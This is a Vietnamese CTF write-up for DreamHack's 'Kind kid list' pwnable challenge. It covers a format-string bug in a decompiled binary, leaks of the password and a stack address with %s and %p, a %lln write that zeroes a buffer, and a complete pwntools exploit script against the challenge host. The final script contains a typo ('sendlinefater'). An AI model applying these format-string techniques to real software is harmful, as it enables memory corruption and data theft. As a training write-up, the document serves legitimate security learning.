# Kind-kid-list---Write-up-----DreamHack
Hướng dẫn cách giải bài Kind kid list cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 21/3/2026

## 1. Mục tiêu cần làm
Bài này các lớp phòng thủ không quan trọng lắm đâu, hãy bắt đầu đọc code luôn nào. Mình sẽ chỉ show ra các chỗ nào là code chính và gây ra lỗi thôi.

```C
  init(argc, argv, envp);
  intro();
  i = 0;
  v25 = 0;
  v22 = 0;
  v26 = 0;
  *(_QWORD *)src = 0x6E7233767977LL;
  memset(v20, 0, 0x80uLL);
  *(_QWORD *)dest = 0LL;
  v19 = 0LL;
  *(_QWORD *)v16 = 0LL;
  v17 = 0LL;
  *(_QWORD *)s2 = 0LL;
  v15 = 0LL;
  ptr = malloc(8uLL);
  stream = fopen("/dev/urandom", "r");
  fread(ptr, 7uLL, 1uLL, stream);    // Tạo password bằng random
  v3 = src;
  v4 = dest;
  strcpy(dest, src);
```

```C
      else if ( v22 == 2 )
      {
        printf("\nPassword : ");
        fflush(stdout);
        __isoc99_scanf("%8s", s2);
        v3 = s2;
        if ( !strncmp((const char *)ptr, s2, 7uLL) )
        {
          printf("Name : ");
          fflush(stdout);
          v3 = v16;
          __isoc99_scanf("%8s", v16);
          if ( v26 > 7 )
          {
            v4 = "Kind list full";
            puts("Kind list full");
          }
          else
          {
            v3 = v16;
            v4 = &v20[16 * v26];
            strcpy(v4, v16);
            ++v26;
          }
        }
        else
        {
          printf(s2);         // Format String
          v4 = " is Wrong password!";
          puts(" is Wrong password!");
```

```C
  if ( !strcmp(v20, "wyv3rn") )
  {
    for ( i = 0; i <= 5; ++i )
    {
      v9 = &src[i];
      if ( !strcmp(&dest[i], v9) )
      {
        puts("Wyv3rn : My name is still remain on the naughty kid list!");
        exit(0);
      }
    }
    puts("\nWyv3rn : You did it!");
    puts("Wyv3rn : Here is flag!");
    ((void (__fastcall *)(const char *, const char *, __int64, __int64, __int64, __int64))flag)(
      "Wyv3rn : Here is flag!",
```

Ok hãy bắt đầu với cái đoạn code đầu tiên, con trỏ `ptr` được malloc và gán bằng 7 byte ngẫu nhiên. Tiếp theo là mảng `dest` được copy từ `src` qua. Ở đoạn code cuối là kiểm tra và đưa ra flag, bạn thấy rằng nó kiểm tra `if ( !strcmp(&dest[i], v9) )`. Nếu `dest` vẫn giữ nguyên chuỗi được copy qua từ `src` thì sẽ không pass qua được đoạn này. Chưa kể ta phải `if ( !strcmp(v20, "wyv3rn") )` bỏ tên `wyv3rn` vào `v20` nữa. Giờ thì làm sao ?

Giờ đầu tiên ta bắt đầu với việc phải leak password đã. Vì bài này có **Format String** nên ta hãy tận dụng nó để leak ra password. Con trỏ `ptr` trỏ vào heap và trong đó có password, ta sẽ dùng `%s` để leak ra.

Sau khi có password thì ta sẽ thêm tên `wyv3rn` vào danh sách trẻ ngoan. Nhưng giờ làm sao để làm cho mảng `dest` mất hết tất cả chuỗi mà được copy qua từ `src` ? Ta sẽ dùng `%lln`, ta không thể dùng `%n` vì nó chỉ cho nhập 8 byte vô thôi không đủ để ghi vào. Để dùng `%lln` ta cần tìm 1 tham số để ghi địa chỉ `dest` vào. Lúc này ta sẽ nhìn thấy `v16`.

Khi nhập tên vào danh sách trẻ ngoan, ta sẽ nhập vào `v16`, và sau đó 1 biến khác là `v3` sẽ lấy giá trị `v16` và bỏ vào `v20`. Lúc này tác giả quên gán lại cho `v16` = null nên giá trị nó vẫn còn dù cho ta đã hoàn tất việc nhập tên vào. Vậy thì ta sẽ nhập địa chỉ `dest` vào `v16` và sau đó dùng `%lln` để ghi 0 byte vào nó là xong. Ok bắt tay vô thôi.

## 2. Cách thực thi
Đầu tiên là leak password. Ta cần tìm được offset từ `v2` đến `ptr` để tính ra offset.

<img width="807" height="641" alt="image" src="https://github.com/user-attachments/assets/03e800f3-7d5d-410d-b765-6914ff966e1c" />

Vì chỉ có mình `ptr` trỏ vào heap nên nhìn vào là ta thấy được đó là vị trí `0x7fffffffdc98`. Công thức tính offset mình đã có đề cập ở các bài trước rồi. Đó là ` ( offset / 8 ) + 6 `. Vậy offset là 31, ta sẽ ghi là `%31$s` để in password ra.

```Python
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Password :', b'%31$s')
password = p.recvuntil(b" is Wrong password!", drop=True)
log.success(f"Password : {password}")
```

Giờ ta cần leak stack để tính được vị trí `dest`, nhìn xuống tí nữa ta sẽ thấy tại `0x7fffffffdcd8` có chứa giá trị stack, vẫn công thức cũ, ta tính được offset là 39. Vậy ta sẽ gửi `%39$p` là ra được stack, sau đó ta sẽ tìm được vị trí của `dest`.

```Python
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Password :', b'%39$p')
leak_data = p.recvuntil(b" is Wrong password!", drop=True)
stack_leak = int(leak_data, 16)
log.success(f"Stack : {hex(stack_leak)}")

dest_addr = stack_leak - 0x1d8
log.success(f"Dest : {hex(dest_addr)}")
```

Sau khi đã leak xong hết giờ ta sẽ ghi tên `wyv3rn` vào trước đã để pass được điều kiện đầu tiên.

```Python
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Password :', password)
p.sendlineafter(b'Name : ', b'wyv3rn')
```

Giờ ta sẽ ghi địa chỉ `dest` vào thằng `v16` và sau đó dùng lỗi **Format String** để biến nó thằng full byte null. Để tìm được offset của thằng `v16` thì các bạn lấy vị trí của nó trong ida là `rsp+10h` - `rsp+0h` của thằng `s2`. Sau đó chia 8 cộng thêm 6 là ra.

```Python
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Password :', password)
p.sendlineafter(b'Name : ', p64(dest_addr))

p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Password :', b'%8$lln')
```

Sau khi thỏa mãn hết tất cả điều kiện, ta chỉ cần chọn option 3 và out ra là xong. Thật ra bài này các bạn có thể tìm offset thông qua các địa chỉ nó đã ghi sẵn trong ida, không cần nhất thiết phải vô gdb coi đâu. Mình vô đó coi để xem stack như nào để kiếm được offset để leak vị trí stack ra thôi. Bên cạnh đó bài này nó nhiều biến để làm các bạn rối mắt thôi chứ thật ra nếu bạn nhìn thấy lỗi thì sẽ làm rất dễ. Thôi thì hãy cho mình 1 star để có động lực viếp tiếp nha 🐧.

## 3. Exploit
```Python
from pwn import *

exe = ELF("./kind_kid_list_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process([exe.path])
p = remote('host3.dreamhack.games', 20163)

p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Password :', b'%31$s')
password = p.recvuntil(b" is Wrong password!", drop=True)
log.success(f"Password : {password}")

p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Password :', b'%39$p')
leak_data = p.recvuntil(b" is Wrong password!", drop=True)
stack_leak = int(leak_data, 16)
log.success(f"Stack : {hex(stack_leak)}")

dest_addr = stack_leak - 0x1d8
log.success(f"Dest : {hex(dest_addr)}")

p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Password :', password)
p.sendlineafter(b'Name : ', b'wyv3rn')

p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Password :', password)
p.sendlineafter(b'Name : ', p64(dest_addr))

p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'Password :', b'%8$lln')

p.sendlinefater(b'>> ', b'3')

p.interactive()
```
